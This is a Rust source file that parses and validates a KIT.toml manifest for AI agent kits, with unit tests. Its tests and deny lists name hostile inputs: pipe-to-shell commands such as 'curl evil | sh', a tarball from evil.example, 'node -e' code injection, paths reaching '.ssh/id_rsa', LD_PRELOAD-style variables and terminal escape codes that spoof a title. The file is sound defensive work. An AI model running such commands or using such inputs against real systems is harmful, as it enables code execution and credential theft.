//! `KIT.toml`: one kit, the skills, rules, MCP servers, hooks, gate and
//! check that set an agent up for one job. See `docs/dev/DESIGN-KITS.md` §2.

use anyhow::{Result, bail};
use kit_core::GateConfig;
use serde::Deserialize;
use std::collections::BTreeMap;

/// The only schema this build reads.
pub const SCHEMA: u32 = 1;

#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct KitManifest {
    pub schema: u32,
    pub kit: KitMeta,
    #[serde(default)]
    pub skill: Vec<SkillRef>,
    pub rules: Option<Rules>,
    #[serde(default)]
    pub mcp: BTreeMap<String, McpServer>,
    #[serde(default)]
    pub hook: Vec<Hook>,
    pub gate: Option<GateConfig>,
    #[serde(default)]
    pub check: Check,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct KitMeta {
    pub name: String,
    pub title: String,
    pub version: String,
    pub description: String,
    #[serde(default)]
    pub extends: Vec<String>,
    /// Agents the kit was written and tested for. A claim, not a filter.
    #[serde(default)]
    pub agents: Vec<String>,
    pub licence: Option<String>,
    /// A first task to try once the kit is installed.
    pub example: Option<String>,
}

/// A skill: upstream (`source` + `rev`) or shipped inside the kit.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct SkillRef {
    /// Folder name the skill installs as.
    pub name: String,
    /// `github:owner/repo`; absent for a skill inside the kit.
    pub source: Option<String>,
    /// Path to the skill folder, in `source` or in the kit.
    pub path: String,
    /// Full commit sha; required with `source`.
    pub rev: Option<String>,
    pub licence: Option<String>,
}

impl SkillRef {
    /// `owner/repo@abcdef0`, or `None` for a skill inside the kit.
    pub fn origin(&self) -> Option<String> {
        let repo = self.source.as_deref()?.strip_prefix("github:")?;
        let rev = self.rev.as_deref().unwrap_or_default();
        Some(format!("{repo}@{}", rev.get(..7).unwrap_or(rev)))
    }
}

#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Rules {
    pub file: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Deserialize, serde::Serialize)]
#[serde(deny_unknown_fields)]
pub struct McpServer {
    /// A local server: the program to start (with `args`).
    pub command: Option<String>,
    /// A remote server: an `https://` URL. Exactly one of `command`, `url`.
    pub url: Option<String>,
    #[serde(default)]
    pub args: Vec<String>,
    /// Values may only name the user's environment: `"$API_KEY"`.
    #[serde(default)]
    pub env: BTreeMap<String, String>,
}

impl McpServer {
    /// What the plan shows: the command line, or the URL.
    pub fn command_line(&self) -> String {
        match (&self.command, &self.url) {
            (Some(cmd), _) => std::iter::once(cmd.as_str())
                .chain(self.args.iter().map(String::as_str))
                .collect::<Vec<_>>()
                .join(" "),
            (None, Some(url)) => url.clone(),
            (None, None) => String::new(),
        }
    }

    /// A local server runs code on the user's machine; a remote one does not.
    pub fn runs_code(&self) -> bool {
        self.command.is_some()
    }
}

/// Portable hook events. v0.1 has one; each agent writer maps it.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HookEvent {
    AfterEdit,
}

impl HookEvent {
    pub fn label(self) -> &'static str {
        match self {
            Self::AfterEdit => "after each edit",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Hook {
    pub on: HookEvent,
    /// Only files matching this glob trigger the hook.
    pub glob: Option<String>,
    /// Command to run; `$FILE` is the edited file.
    pub run: String,
}

/// How `kit doctor` proves the kit is live.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Check {
    #[serde(default)]
    pub mcp_starts: Vec<String>,
    #[serde(default)]
    pub commands: Vec<String>,
}

impl KitManifest {
    /// Parse and validate. Errors name the kit and the field.
    pub fn parse(raw: &str, origin: &str) -> Result<Self> {
        // Escape codes in a title or command could redraw the confirm
        // screen, so no string in a KIT.toml may hold a control character.
        if let Ok(value) = raw.parse::<toml::Table>()
            && let Some(bad) = control_char(&toml::Value::Table(value))
        {
            bail!(
                "{origin}: '{bad}' contains a control character. Kit shows every string as typed, so none are allowed"
            );
        }
        let m: Self = toml::from_str(raw)
            .map_err(|e| anyhow::anyhow!("{origin} is not a valid KIT.toml: {e}"))?;
        m.validate(origin)?;
        Ok(m)
    }

    /// Anything that runs on the user's machine: hooks and MCP servers.
    pub fn runs_code(&self) -> usize {
        self.mcp.values().filter(|m| m.runs_code()).count() + self.hook.len()
    }

    fn validate(&self, origin: &str) -> Result<()> {
        let name = &self.kit.name;
        if self.schema != SCHEMA {
            bail!(
                "{origin} uses KIT.toml schema {}, this kit understands {SCHEMA}. Update kit",
                self.schema
            );
        }
        if !is_slug(name) {
            bail!("{origin}: kit name '{name}' must be lowercase letters, digits and dashes");
        }
        for s in &self.skill {
            if !is_slug(&s.name) {
                bail!(
                    "kit {name}: skill name '{}' must be lowercase letters, digits and dashes",
                    s.name
                );
            }
            if !is_inside(&s.path) {
                bail!(
                    "kit {name}: skill {} path must stay inside its source",
                    s.name
                );
            }
            match (&s.source, &s.rev) {
                (Some(src), Some(rev)) => {
                    if src
                        .strip_prefix("github:")
                        .is_none_or(|r| r.split('/').count() != 2)
                    {
                        bail!(
                            "kit {name}: skill {} source '{src}' must be github:owner/repo",
                            s.name
                        );
                    }
                    if rev.len() != 40 || !rev.bytes().all(|b| b.is_ascii_hexdigit()) {
                        bail!(
                            "kit {name}: skill {} rev must be a full 40-character commit sha",
                            s.name
                        );
                    }
                }
                (Some(_), None) => {
                    bail!(
                        "kit {name}: skill {} has a source but no rev. Pin a commit",
                        s.name
                    )
                }
                (None, Some(_)) => bail!("kit {name}: skill {} has a rev but no source", s.name),
                (None, None) => {}
            }
        }
        if let Some(r) = &self.rules
            && !is_inside(&r.file)
        {
            bail!(
                "kit {name}: rules file '{}' must be a path inside the kit",
                r.file
            );
        }
        for (server, mcp) in &self.mcp {
            if !is_slug(server) {
                bail!(
                    "kit {name}: mcp server name '{server}' must be lowercase letters, digits and dashes"
                );
            }
            for (key, value) in &mcp.env {
                if !env_ref(value) {
                    bail!(
                        "kit {name}: mcp {server} env {key} must name one environment variable (\"$NAME\", capitals, digits and _). Kits never carry secrets"
                    );
                }
                if steers_program(key) {
                    bail!(
                        "kit {name}: mcp {server} env {key} changes what the program runs; kits may not set it"
                    );
                }
            }
            match (&mcp.command, &mcp.url) {
                (Some(_), None) => {}
                (None, Some(url)) if url.starts_with("https://") => {}
                (None, Some(url)) => {
                    bail!("kit {name}: mcp {server} url '{url}' must start with https://")
                }
                _ => bail!("kit {name}: mcp {server} needs exactly one of command or url"),
            }
            if let Some(cmd) = &mcp.command
                && let Err(why) = check_launch(cmd, &mcp.args)
            {
                bail!("kit {name}: mcp {server}: {why}");
            }
        }
        for c in &self.check.mcp_starts {
            if !self.mcp.contains_key(c) {
                bail!("kit {name}: check.mcp_starts names '{c}', which is not an [mcp] server");
            }
        }
        Ok(())
    }
}

pub fn is_slug(s: &str) -> bool {
    !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
        && !s.starts_with('-')
}

/// A relative path with no `..`: it cannot leave the kit or its source.
/// Kits come from other people, so an absolute path or `../` would read
/// files on the user's machine into their agent's instructions.
fn is_inside(path: &str) -> bool {
    !path.is_empty()
        && !path.starts_with(['/', '\\'])
        && !path.contains(':')
        && path.split(['/', '\\']).all(|part| part != "..")
}

/// The first string (as `key: value`) holding a control character, if any.
fn control_char(v: &toml::Value) -> Option<String> {
    match v {
        toml::Value::String(s) if s.chars().any(char::is_control) => {
            Some(s.escape_debug().to_string())
        }
        toml::Value::Array(items) => items.iter().find_map(control_char),
        toml::Value::Table(t) => t.iter().find_map(|(k, v)| {
            if k.chars().any(char::is_control) {
                Some(k.escape_debug().to_string())
            } else {
                control_char(v)
            }
        }),
        _ => None,
    }
}

/// How a local MCP server may be started. Only these forms pass:
///
/// - `npx`/`bunx` (only `-y`/`--yes` before the package), `pnpm dlx` or
///   `yarn dlx`, with one npm package at an exact version;
/// - `uvx` with one PyPI package at an exact version (`name==1.2.3`);
/// - the server's own program by bare name, when it is not a shell, an
///   interpreter, a package manager or a program that starts another
///   program (`env`, `nohup`, `busybox`, …), and no argument hands it code
///   to run (`-c`, `-e`, `--eval=…`).
///
/// Anything else is refused, so what the user approved is what runs.
fn check_launch(command: &str, args: &[String]) -> std::result::Result<(), String> {
    if command.contains(['/', '\\']) {
        return Err(format!(
            "command '{command}' must be a program name found on PATH, not a path"
        ));
    }
    if command.is_empty()
        || !command
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
    {
        return Err(format!("command '{command}' is not a plain program name"));
    }
    let program = command.to_ascii_lowercase();
    let program = program
        .strip_suffix(".cmd")
        .or_else(|| program.strip_suffix(".exe"))
        .or_else(|| program.strip_suffix(".bat"))
        .unwrap_or(&program);
    let first_plain = |flags: &[&str], args: &[String]| -> std::result::Result<String, String> {
        for a in args {
            if !a.starts_with('-') {
                return Ok(a.clone());
            }
            if !flags.contains(&a.as_str()) {
                return Err(format!(
                    "{command} option '{a}' is not allowed before the package; name the package first"
                ));
            }
        }
        Err(format!("{command} needs a package at an exact version"))
    };
    match program {
        "npx" | "bunx" => {
            let pkg = first_plain(&["-y", "--yes"], args)?;
            npm_exact(&pkg).then_some(()).ok_or_else(|| {
                format!("'{pkg}' must be one npm package at an exact version (name@1.2.3)")
            })
        }
        "pnpm" | "yarn" => {
            let rest = match args.split_first() {
                Some((verb, rest)) if verb == "dlx" => rest,
                _ => {
                    return Err(format!(
                        "{command} may only run `{command} dlx package@1.2.3`"
                    ));
                }
            };
            let pkg = first_plain(&[], rest)?;
            npm_exact(&pkg).then_some(()).ok_or_else(|| {
                format!("'{pkg}' must be one npm package at an exact version (name@1.2.3)")
            })
        }
        "uvx" => {
            let pkg = first_plain(&[], args)?;
            pypi_exact(&pkg).then_some(()).ok_or_else(|| {
                format!("'{pkg}' must be one PyPI package at an exact version (name==1.2.3)")
            })
        }
        _ if runs_other_code(program) => Err(format!(
            "'{command}' can run any code; start the server's own program, or use npx, bunx, pnpm dlx or uvx with an exact version"
        )),
        _ => match args.iter().find(|a| hands_over_code(a)) {
            Some(a) => Err(format!(
                "'{command}' option '{a}' passes code to run; not allowed"
            )),
            None => Ok(()),
        },
    }
}

/// Shells, interpreters, package managers and programs whose job is to
/// start another program. Version suffixes count (`python3.12`, `node22`).
fn runs_other_code(program: &str) -> bool {
    const FAMILIES: &[&str] = &[
        "sh",
        "bash",
        "zsh",
        "fish",
        "dash",
        "ksh",
        "csh",
        "tcsh",
        "ash",
        "nu",
        "elvish",
        "xonsh",
        "busybox",
        "toybox",
        "cmd",
        "command",
        "powershell",
        "pwsh",
        "wsl",
        "cscript",
        "wscript",
        "mshta",
        "rundll",
        "regsvr",
        "start",
        "node",
        "nodejs",
        "deno",
        "bun",
        "python",
        "py",
        "pypy",
        "ruby",
        "irb",
        "perl",
        "php",
        "lua",
        "luajit",
        "tclsh",
        "wish",
        "osascript",
        "java",
        "jshell",
        "dotnet",
        "go",
        "cargo",
        "rustc",
        "gcc",
        "cc",
        "make",
        "awk",
        "gawk",
        "sed",
        "env",
        "nohup",
        "sudo",
        "doas",
        "su",
        "runuser",
        "pkexec",
        "exec",
        "xargs",
        "time",
        "timeout",
        "nice",
        "ionice",
        "stdbuf",
        "setsid",
        "script",
        "strace",
        "ltrace",
        "chroot",
        "flock",
        "watch",
        "parallel",
        "unbuffer",
        "expect",
        "ssh",
        "npm",
        "pnpx",
        "yarnpkg",
        "uv",
        "pip",
        "pipx",
        "poetry",
        "conda",
        "docker",
        "podman",
        "nerdctl",
        "git",
        "curl",
        "wget",
    ];
    let base = program.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.' || c == '-');
    FAMILIES.contains(&base) || FAMILIES.contains(&program)
}

/// An argument that gives the program code to run rather than settings.
fn hands_over_code(arg: &str) -> bool {
    let flag = arg.split_once('=').map_or(arg, |(f, _)| f);
    matches!(
        flag,
        "-c" | "-e"
            | "-E"
            | "--eval"
            | "--exec"
            | "--execute"
            | "--command"
            | "--run"
            | "--script"
            | "--require"
            | "--import"
            | "--loader"
    ) || (flag.starts_with('-')
        && !flag.starts_with("--")
        && flag.len() > 2
        && flag[1..].chars().all(|c| c.is_ascii_alphabetic())
        && flag[1..].contains(['c', 'e']))
}

/// `$NAME`: exactly one variable, capitals, digits and `_`.
fn env_ref(value: &str) -> bool {
    let Some(name) = value.strip_prefix('$') else {
        return false;
    };
    let mut chars = name.chars();
    chars
        .next()
        .is_some_and(|c| c.is_ascii_uppercase() || c == '_')
        && chars.all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
}

/// Variables that make an approved program load or run other code.
fn steers_program(key: &str) -> bool {
    let k = key.to_ascii_uppercase();
    k.starts_with("LD_")
        || k.starts_with("DYLD_")
        || k.starts_with("PYTHON")
        || matches!(
            k.as_str(),
            "NODE_OPTIONS" | "RUBYOPT" | "PERL5OPT" | "BASH_ENV" | "ENV"
        )
}

/// `name@1.2.3` or `@scope/name@1.2.3`: a registry name and an exact
/// version. No ranges, tags, URLs, tarballs, git or file specs.
fn npm_exact(spec: &str) -> bool {
    let body = spec.strip_prefix('@').unwrap_or(spec);
    let Some((name, version)) = body.rsplit_once('@') else {
        return false;
    };
    let name_ok = |s: &str| {
        !s.is_empty()
            && !s.starts_with('.')
            && s.bytes().all(|b| {
                b.is_ascii_lowercase() || b.is_ascii_digit() || matches!(b, b'-' | b'.' | b'_')
            })
    };
    let names_ok = match spec.starts_with('@') {
        true => name
            .split_once('/')
            .is_some_and(|(scope, n)| name_ok(scope) && name_ok(n)),
        false => name_ok(name),
    };
    names_ok && exact_semver(version)
}

/// `name==1.2.3` (or `name@1.2.3`, which uvx also takes).
fn pypi_exact(spec: &str) -> bool {
    let Some((name, version)) = spec.split_once("==").or_else(|| spec.split_once('@')) else {
        return false;
    };
    !name.is_empty()
        && name
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.'))
        && !version.is_empty()
        && version.starts_with(|c: char| c.is_ascii_digit())
        && version
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'.')
}

/// `1.2.3`, optionally `-pre.1` / `+build`: three numbers, nothing loose.
fn exact_semver(v: &str) -> bool {
    let core = v.split(['-', '+']).next().unwrap_or("");
    let rest = &v[core.len()..];
    core.split('.').count() == 3
        && core
            .split('.')
            .all(|n| !n.is_empty() && n.bytes().all(|b| b.is_ascii_digit()))
        && rest
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'+' | b'.'))
}

#[cfg(test)]
mod tests {
    use super::*;

    const MIN: &str = "schema = 1\n[kit]\nname = \"x\"\ntitle = \"X\"\nversion = \"0.1.0\"\ndescription = \"d\"\n";

    fn parse(extra: &str) -> Result<KitManifest> {
        KitManifest::parse(&format!("{MIN}{extra}"), "test")
    }

    #[test]
    fn minimal_kit_parses() {
        let m = parse("").unwrap();
        assert_eq!(m.kit.name, "x");
        assert_eq!(m.runs_code(), 0);
    }

    #[test]
    fn unknown_keys_are_errors() {
        let err = parse("[kit2]\n").unwrap_err().to_string();
        assert!(err.contains("kit2"), "{err}");
    }

    #[test]
    fn upstream_skills_must_be_pinned() {
        let base = "[[skill]]\nname = \"s\"\npath = \"skills/s\"\nsource = \"github:o/r\"\n";
        let err = parse(base).unwrap_err().to_string();
        assert!(err.contains("no rev"), "{err}");
        let err = parse(&format!("{base}rev = \"main\"\n"))
            .unwrap_err()
            .to_string();
        assert!(err.contains("40-character"), "{err}");
        let sha = "2686b620fc1fed2e8f60c704839c766b8594c6b6";
        let m = parse(&format!("{base}rev = \"{sha}\"\n")).unwrap();
        assert_eq!(m.skill[0].origin().as_deref(), Some("o/r@2686b62"));
    }

    #[test]
    fn skill_paths_cannot_escape() {
        let err = parse("[[skill]]\nname = \"s\"\npath = \"../x\"\n")
            .unwrap_err()
            .to_string();
        assert!(err.contains("inside"), "{err}");
        for bad in ["/etc", "C:\\\\x", "\\\\server\\\\x", ""] {
            let err = parse(&format!("[[skill]]\nname = \"s\"\npath = \"{bad}\"\n"))
                .unwrap_err()
                .to_string();
            assert!(err.contains("inside"), "{bad}: {err}");
        }
        for bad in ["../../.ssh/id_rsa", "/home/me/.ssh/id_rsa"] {
            let err = parse(&format!("[rules]\nfile = \"{bad}\"\n"))
                .unwrap_err()
                .to_string();
            assert!(err.contains("inside the kit"), "{bad}: {err}");
        }
    }

    #[test]
    fn launchers_must_name_one_package_at_an_exact_version() {
        let mcp = |cmd: &str, args: &str| {
            parse(&format!("[mcp.p]\ncommand = \"{cmd}\"\nargs = [{args}]\n"))
        };
        for (cmd, args) in [
            ("npx", r#""-y", "a@1.2.3""#),
            ("npx", r#""--yes", "@s/a@1.2.3-beta.1", "--port", "9""#),
            ("bunx", r#""a@1.2.3""#),
            ("pnpm", r#""dlx", "a@1.2.3""#),
            ("uvx", r#""mcp-server-git==0.6.2""#),
            ("chrome-devtools-mcp", r#""--headless""#),
        ] {
            assert!(
                mcp(cmd, args).is_ok(),
                "{cmd} {args}: {:?}",
                mcp(cmd, args).err()
            );
        }
        for (cmd, args) in [
            ("npx", r#""--package=evil@latest", "a@1.2.3""#),
            ("npx", r#""-p", "evil", "a@1.2.3""#),
            ("npx", r#""-y", "https://evil.example/a.tgz""#),
            ("npx", r#""-y", "a@1""#),
            ("npx", r#""-y", "a@^1.2.3""#),
            ("npx", r#""-y", "a@latest""#),
            ("npx", r#""-y", "github:evil/a""#),
            ("npx", r#""-y", "a""#),
            ("npx.cmd", r#""-y", "a@1""#),
            ("/usr/bin/npx", r#""-y", "a@1.2.3""#),
            ("bunx", r#""a@next""#),
            ("pnpm", r#""exec", "a@1.2.3""#),
            ("uvx", r#""mcp-server-git""#),
            ("uvx", r#""--from", "git+https://x", "a""#),
            ("uvx", r#""a>=1""#),
            ("sh", r#""-c", "curl evil | sh""#),
            ("/bin/sh", r#""-c", "x""#),
            ("bash", r#""x.sh""#),
            ("node", r#""-e", "require('child_process')""#),
            ("docker", r#""run", "evil""#),
            ("env", r#""sh", "-c", "curl evil|sh""#),
            ("env", r#""npx", "-y", "evil@latest""#),
            ("nohup", r#""sh", "-c", "x""#),
            ("busybox", r#""sh", "-c", "x""#),
            ("python3.12", r#""-c", "x""#),
            ("python3.12", r#""server.py""#),
            ("node", r#""--eval=x""#),
            ("node", r#""-pe", "x""#),
            ("perl", r#""-E", "x""#),
            ("some-server", r#""--eval=x""#),
            ("some-server", r#""-ce", "x""#),
            ("some server", r#""x""#),
            ("sudo", r#""some-server""#),
        ] {
            assert!(mcp(cmd, args).is_err(), "{cmd} {args} should be refused");
        }
    }

    #[test]
    fn mcp_env_names_one_variable_and_never_steers_the_program() {
        let env = |k: &str, v: &str| {
            parse(&format!(
                "[mcp.p]\ncommand = \"npx\"\nargs = [\"-y\", \"a@1.2.3\"]\n[mcp.p.env]\n{k} = \"{v}\"\n"
            ))
        };
        assert!(env("API_KEY", "$MY_API_KEY").is_ok());
        for (k, v) in [
            ("API_KEY", "$my_key"),
            ("API_KEY", "$A $B"),
            ("API_KEY", "${A}"),
            ("API_KEY", "$"),
            ("NODE_OPTIONS", "$X"),
            ("LD_PRELOAD", "$X"),
            ("DYLD_INSERT_LIBRARIES", "$X"),
            ("PYTHONSTARTUP", "$X"),
            ("BASH_ENV", "$X"),
            ("ENV", "$X"),
        ] {
            assert!(env(k, v).is_err(), "{k}={v} should be refused");
        }
    }

    #[test]
    fn strings_cannot_hold_control_characters() {
        let err = parse("[mcp.p]\nurl = \"https://x\\u001b[2K\"\n")
            .unwrap_err()
            .to_string();
        assert!(err.contains("control character"), "{err}");
        let raw = MIN.replace("title = \"X\"", "title = \"X\\u001b[1A\\rOfficial\"");
        let err = KitManifest::parse(&raw, "t").unwrap_err().to_string();
        assert!(err.contains("control character"), "{err}");
    }

    #[test]
    fn mcp_must_pin_and_carry_no_secrets() {
        let err =
            parse("[mcp.p]\ncommand = \"npx\"\nargs = [\"-y\", \"@playwright/mcp@latest\"]\n")
                .unwrap_err()
                .to_string();
        assert!(err.contains("exact version"), "{err}");
        assert!(
            parse("[mcp.p]\ncommand = \"npx\"\nargs = [\"-y\", \"@playwright/mcp@0.0.82\"]\n")
                .is_ok()
        );
        assert!(parse("[mcp.p]\ncommand = \"npx\"\nargs = [\"-y\", \"pkg@1.0.0\"]\n").is_ok());
        let err = parse("[mcp.p]\ncommand = \"srv\"\nenv = { KEY = \"sk-live-123\" }\n")
            .unwrap_err()
            .to_string();
        assert!(err.contains("never carry secrets"), "{err}");
    }

    #[test]
    fn remote_mcp_is_https_and_runs_no_code() {
        let m = parse("[mcp.docs]\nurl = \"https://example.com/mcp\"\n").unwrap();
        assert_eq!(m.runs_code(), 0);
        let err = parse("[mcp.docs]\nurl = \"http://example.com/mcp\"\n")
            .unwrap_err()
            .to_string();
        assert!(err.contains("https://"), "{err}");
        let err = parse("[mcp.docs]\nargs = []\n").unwrap_err().to_string();
        assert!(err.contains("exactly one"), "{err}");
    }

    #[test]
    fn checks_name_real_servers() {
        let err = parse("[check]\nmcp_starts = [\"nope\"]\n")
            .unwrap_err()
            .to_string();
        assert!(err.contains("nope"), "{err}");
    }
}
